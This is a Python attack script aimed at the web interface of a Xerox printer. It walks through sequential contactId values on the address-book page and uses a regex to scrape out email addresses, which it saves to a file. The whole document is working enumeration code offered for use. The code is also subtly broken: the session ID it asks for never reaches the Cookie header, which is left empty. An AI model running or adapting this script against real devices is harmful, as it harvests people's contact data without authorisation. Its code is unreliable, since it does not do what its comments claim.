import requests
import re

# Set the URL and headers
url = "/addressbook/viewContact.php"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Cookie": "PHPSESSID="  # PHPSESSID value will be provided by user input
}

# Get the IP address from user input
ip_address = input("Enter the IP address of the Xerox printer: ")

# Get the number of "All Contacts" from user input
all_contacts = int(input("Enter the number of 'All Contacts' displayed in the Address Book: "))

# Input PHPSESSID value from user
phpsessid = input("Enter PHPSESSID value: ")

# Initialize variables
email_list = []

for contact_id in range(all_contacts):
    # Set the parameters
    params = {"contactId": str(contact_id)}

    # Make the HTTPS request
    response = requests.get(f"https://{ip_address}{url}", params=params, headers=headers)

    # Filter the response to find email addresses
    pattern = r"<h6>Email</h6>\s*<span class=\"subText\">(.*?)</span>"
    matches = re.findall(pattern, response.text)

    if matches:
        email_list.append(matches[0])

# Save the discovered email addresses to a text file
with open("discovered-emails.txt", "w") as file:
    file.write("\n".join(email_list))

print("Email addresses saved to 'discovered-emails.txt'")
